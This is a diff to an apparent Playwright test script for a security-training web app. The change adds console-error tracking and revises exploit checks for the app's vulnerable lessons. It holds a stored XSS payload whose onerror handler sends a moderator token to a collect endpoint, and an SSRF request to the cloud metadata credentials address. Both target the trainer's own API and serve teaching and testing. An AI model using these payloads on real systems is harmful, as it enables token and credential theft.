@@ -24,11 +24,18 @@ async (page) => {
   };
 
   // Crashes: Blazor logs this when a component throws and the page stops responding.
+  // Every other console error or warning is collected too: a clean run has none.
   const crashes = [];
+  const issues = new Map();   // "type: message @ page" -> count
+  const note = (type, text) => {
+    const key = `${type}: ${text.slice(0, 160)} @ ${new URL(page.url()).pathname}`;
+    issues.set(key, (issues.get(key) || 0) + 1);
+  };
   page.on('console', (m) => {
     if (m.type() === 'error' && /unhandled exception on the current circuit/i.test(m.text())) crashes.push(page.url());
+    if (m.type() === 'error' || m.type() === 'warning') note(m.type(), `${m.text()} ${m.location().url || ''}`.trim());
   });
-  page.on('pageerror', (e) => crashes.push(`${page.url()}: ${e.message}`));
+  page.on('pageerror', (e) => { crashes.push(`${page.url()}: ${e.message}`); note('pageerror', e.message); });
 
   const setSettings = (storyMode) => page.evaluate(({ language, storyMode }) => {
     localStorage.setItem('securityTrainer.settings', JSON.stringify({ language, codeStyle: 'MinimalApi', storyMode }));
@@ -147,7 +154,8 @@ async (page) => {
         { body: JSON.stringify({ url: 'http://169.254.169.254/latest/credentials' }) })) },
     { slug: 'blazor-xss', fix: 'encode-output',
       exploit: async () => {
-        const payload = `<img src=x onerror="new Image().src='${api('blazor-xss/collect')}?t='+modToken">`;
+        // An empty data: image fails to load without a network request, so onerror fires and nothing 404s.
+        const payload = `<img src="data:," onerror="new Image().src='${api('blazor-xss/collect')}?t='+modToken">`;
         await send('POST', api('blazor-xss/comments'), { body: JSON.stringify({ text: `Hello Lore ${payload}` }) });
         for (let i = 0; i < 12; i++) {       // the moderator view refreshes every 5 seconds
           await wait(1500);
@@ -189,6 +197,7 @@ async (page) => {
     failed: results.filter((r) => !r.ok).length,
     overview,
     crashes,
+    consoleIssues: [...issues].map(([issue, count]) => `${count}x ${issue}`),
     results,
   };
 }
